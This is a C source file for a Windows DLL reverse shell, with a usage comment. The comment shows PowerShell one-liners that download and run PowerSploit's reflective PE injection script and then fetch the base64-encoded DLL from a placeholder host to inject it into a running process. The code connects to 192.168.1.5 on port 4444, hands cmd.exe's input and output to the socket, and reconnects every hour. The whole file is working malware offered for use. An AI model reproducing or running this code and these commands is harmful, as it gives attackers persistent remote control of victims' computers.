/*
* USAGE: 
*
* [System.Convert]::ToBase64String([IO.File]::ReadAllBytes("ReverseShell.dll")) > dll.txt
*
* iex ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"))
* Invoke-ReflectivePEInjection -PEBytes ([System.Convert]::FromBase64String(((New-Object Net.WebClient).DownloadString("https://blah.org/dll.txt")))) -ProcId 1234
* 
*/

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

DWORD WINAPI ThreadFunc(void* data)
{
	while (true) 
	{
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		
		struct hostent *host;
		host = gethostbyname("192.168.1.5");
		strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

		hax.sin_family = AF_INET;
		hax.sin_port = htons(4444);
		hax.sin_addr.s_addr = inet_addr(ip_addr);

		WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

		memset(&ini_processo, 0, sizeof(ini_processo));
		ini_processo.cb = sizeof(ini_processo);
		ini_processo.dwFlags = STARTF_USESTDHANDLES;
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
		CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

		Sleep(60 * 60000);
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
		CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
	return TRUE;
}
